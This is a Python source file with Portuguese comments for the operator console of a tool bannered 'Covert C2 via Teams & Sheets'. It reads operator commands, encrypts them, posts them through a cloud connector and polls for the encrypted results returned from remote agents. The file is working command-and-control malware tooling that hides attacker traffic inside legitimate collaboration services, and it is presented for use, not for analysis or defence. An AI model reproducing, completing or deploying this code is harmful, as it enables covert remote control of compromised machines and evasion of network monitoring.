import time
import config
from connectors import get_connector
import crypto_utils

class GhostController:
    def __init__(self):
        self.connector = get_connector()
        self.known_results = set() # Para não mostrar o mesmo resultado 2x

    def print_banner(self):
        print("""
   __ _ _               _       _         _     _            
  / _\ | |__   ___  ___| |_    | |__ _ __(_) __| | __ _  ___ 
 / /_| | '_ \ / _ \/ __| __|___| '_ \ '__| |/ _` |/ _` |/ _ \\
/ /_\\ | | | | (_) \__ \ ||_____| |_) | | | | (_| | (_| |  __/
\____/_|_| |_|\___/|___/\__|   |_.__/|_| |_|\__,_|\__, |\___|
                                                  |___/      
        Covert C2 via Teams & Sheets | v1.0
        """)

    def run(self):
        self.print_banner()
        print("[*] Controlador Iniciado. Digite 'exit' para sair, 'refresh' para ver dados.")
        
        while True:
            try:
                cmd = input("\nGhost-Bridge > ").strip()
                
                if not cmd:
                    continue
                    
                if cmd.lower() == 'exit':
                    break
                
                if cmd.lower() == 'refresh':
                    self.check_results()
                    continue

                # Envia comando (Criptografado)
                encrypted_cmd = crypto_utils.encrypt_data(cmd)
                self.connector.post_command(encrypted_cmd)
                print("[*] Comando enviado (Criptografado). Aguardando pickup...")
                
                # Loop de espera ativa por resposta (opcional, para UX melhor)
                print("[*] Monitorando resultados por 10 segundos...")
                for _ in range(10):
                    if self.check_results():
                        break
                    time.sleep(1)

            except KeyboardInterrupt:
                break

    def check_results(self):
        """Checa se há novas respostas na nuvem."""
        results = self.connector.get_results()
        found_new = False
        
        for res in results:
            # Cria uma assinatura única para identificar o resultado
            res_sig = f"{res['command_id']}_{res['timestamp']}"
            
            if res_sig not in self.known_results:
                # Descriptografar a resposta
                decrypted_data = crypto_utils.decrypt_data(res['data'])
                
                print(f"\n[+] RESPOSTA RECEBIDA (Cmd ID: {res['command_id']}):")
                print("-" * 40)
                print(decrypted_data)
                print("-" * 40)
                
                self.known_results.add(res_sig)
                found_new = True
                
        return found_new

if __name__ == "__main__":
    ctrl = GhostController()
    ctrl.run()
